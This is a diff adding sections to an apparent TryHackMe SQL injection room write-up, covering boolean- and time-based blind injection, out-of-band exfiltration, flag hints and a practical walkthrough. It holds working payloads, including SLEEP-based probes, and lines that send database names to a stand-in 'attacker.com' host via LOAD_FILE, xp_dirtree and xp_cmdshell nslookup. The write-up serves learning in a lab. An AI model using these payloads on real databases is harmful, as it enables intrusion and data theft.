@@ -295,3 +295,173 @@ Try both the username and password fields:  some applications only concatenate o
 
 #### FLAG IN TASK 5 *(hint)*:
 Just the boolean condition you must use if you don't the existed input you need.
+
+## Task 6: Blind SQL Injection: Boolean and Time-Based
+
+### Boolean-Based
+
+This suppose to use to when your input return a binary signal (true/false) on some function like in JSON *{"taken":false} , {"taken":true}*
+
+The idea is there is username-check function (Could be the reset password form, that let you put your username first before get in next steps)
+
+The injectable backend query look like this:
+```sql
+SELECT * FROM users WHERE username = '%username%' LIMIT 1;
+```
+
+You can just brute-force some wordlists to match the exists value. but also you can use it to find some specifics value.
+
+Step 1. Use this input to confirm it injectable:
+```sql
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
+```
+if you see the response has *True* condition ({"taken":true})
+You should check if that is the *admin123* exist or the UNION can execute.
+
+Follow the instruction on the Room, I'll continue like the UNION working and the username is non-exists.
+
+Step 2: We try to guess the database name using that wildcard again and again
+
+```sql
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
+```
+
+Follow the *True* Response to mark a completed name of the database. And after we found that name, remember the line I mention on Task 4, go from the biggest to detail. Moving on Step 3 where we using this again but on Table_name
+
+Step 3: guessing the table name 
+
+```sql
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = "db_name" AND table_name LIKE 'a%';--
+```
+
+Just like that you can get *db_name* and *table_name*.
+
+ 
+**Note: This is slow. Each character takes multiple requests. But it is reliable, and it works even when every other output channel is locked down.**
+
+### Time-Based
+
+Time-Based Blind SQLi is for when the application gives you absolutely nothing to work with visually. The page looks identical no matter what you inject. Same content, same status code, same headers. Your only signal is **how long the response takes.**
+
+In MySQL, *SLEEP()* function pause the query execution for a set number of seconds. Wrap a condition around it, and the processing only pause when the condition is true.
+
+```sql
+admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
+```
+
+Step 1: Find the column count
+```sql
+admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
+admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
+```
+
+Step 2: Enumerate data. 
+
+The process is identical to the Boolean-Based one: cycle through characters with LIKE. But instead of checking the page content, you watch the clock. Delay means true. No delay means false.
+
+**A word of caution:** Network latency can mess with time-based detection. On a flaky connection, a natural lag might look like a successful SLEEP(). Use longer sleep values (5-10 seconds) and test each character a couple of times to be sure. On MSSQL, **the equivalent is WAITFOR DELAY '0:0:5'.**
+
+###When To Use Which
+
+| Scenario | Technique |
+| --- | --- |
+|App shows different content for true vs false |	Boolean-Based |
+|App response loks identical, no matter what | Time-Based
+|Time-based is blocked or too unreliable |Out-of-Band (next task)
+
+In the practical walkthrough (Task 9), Level 3 uses Boolean-Based SQLi via a username-check API that returns {"taken":true/false} responses. Level 4 moves to Time-Based SQLi via the Referrer header, with no visible difference in response.
+
+### FLAG IN TASK 6 *(hint)*:
+
+It is the delay function just right above.
+
+## Task 7: Out-Of-Band SQL Injection
+
+**Note: Out-of-Band (OOB) SQL Injection works differently from everything covered so far. Instead of reading results through the web response, you force the database server to reach out to a server you control through a separate channel, usually DNS or HTTP, and carry the stolen data with it.**
+
+### When you need Out-Of-Band
+This type come in when everything else has failed:
+- In-band off the table (No result or error)
+- Boolean-Based not working because the response look the same regardless of the condition
+- Time-Based not working on the noisy network, it corrupt the delay setting, or *SLEEP()* is blocked.
+- **The Last Chance:** The server can make outbound connection. This mean we can use DNS exfiltration or some MSSQL technique.
+
+### DNS Exfiltration with MySQL
+
+The most common OOB trick for user is *LOAD_FILE()* to trigger DNS lookup. You embed the data you want as a subdomain:
+
+```sql
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+```
+
+So what happen when this code run:
+
+1. *SELECT database()*: pull the database name (use webapp_db for example)
+2. *CONCAT()*: build the sting before it trigger the DNS lookup, it combine the db name with your hook domain: *\\webapp_db.attacker.com\share*
+3. *LOAD_FILE()*: try to read that file first, but then it initiates DNS Lookup for that URL with the webapp_db logs.
+4. Your DNS server catches the request and logs. The data is in subdomain.
+
+### MSSQL technique:
+Microsoft SQL Server has stored procedures that make OOB more direct:
+
+*xp_dirtree* triggers a DNS lookup by trying to list a directory on a remote server:
+
+```sql
+EXEC master..xp_dirtree '\\attacker.com\share';
+```
+xp_cmdshell (if it is enabled) runs OS commands directly, so you can use nslookup or curl to ship data out:
+
+```sql
+EXEC xp_cmdshell 'nslookup data.attacker.com';
+```
+*xp_cmdshell* is off by default in modern MSSQL, but xp_dirtree is still available and gets used regularly in pentests.
+
+### Receiving the Data
+You need something listening on your end to catch what the database sends. A few options:
+
+**Burp Collaborator** gives you a unique subdomain and logs any DNS or HTTP requests to it. Inject the Collaborator domain into your payload, check the Collaborator tab for callbacks.
+
+**Interactsh** from ProjectDiscovery does the same thing but is free and can be self-hosted.
+
+A custom listener, like a Python DNS server with dnslib or a bare-bones HTTP server, if you want full control.
+
+### Limitations
+
+OOB has constraints worth knowing about:
+
+The database server needs outbound network access (many production setups restrict this).
+Payloads are database-engine-specific. MySQL, MSSQL, and PostgreSQL each need different syntax.
+DNS exfiltration has a size limit: subdomain labels are limited to 63 characters each.
+It is generally slower and flakier than pulling data directly.
+
+### FLAG IN TASK 7 *(hint)*:
+Its about which protocol related to OOB technique use when dealing with outbound connection from server to collect data. And what it need to list the directory tree of the MSSQL database server to the Attacker domain.
+
+## Task 8: Remidation and Prevention
+
+Its describing the statement in different programming languages, how its vulnerable, how to fix that. And also some highly recommend guide to protect your webapp from SQL injection. You have to read it on [TryHackMe](https://tryhackme.com/room/sqlinjectionintroduction), its better than I show that to you 
+
+### FLAG IN TASK 8
+ Read the
+
+ ## Task 9: Pratical
+ ![alt text](image.png)
+ So this level showing query by id *https://website.thm/article?id=1*
+
+ But you need the user/password : So doing as the staging process on Task 4.
+
+ 1. First stage: We Found that it have 3 Column on response and what is the database name
+
+ 2. Second stage: we found that there are two tables on the database
+ 3. Retrieve the password required.
+
+ ![alt text](image-1.png)
+
+ Level Two is login form, so you should try the comment first, but in this room the request must be filled in both username and password no matter if the server use that or not, so make sure you typed something in.
+
+![alt text](image-2.png)
+Level Three that is Boolean-Based, how do i know, there your response log above showing there a condition value, so let brute-force this <("). Joking it show that the username already true, it is admin. Let practice like what we need to get the login access. This take a while to check the information that exist so just keep going (Make sure to also use special characters)
+
+![alt text](image-3.png)
+
+Level Four is Time Based doing the same as Boolean but this time count the time.
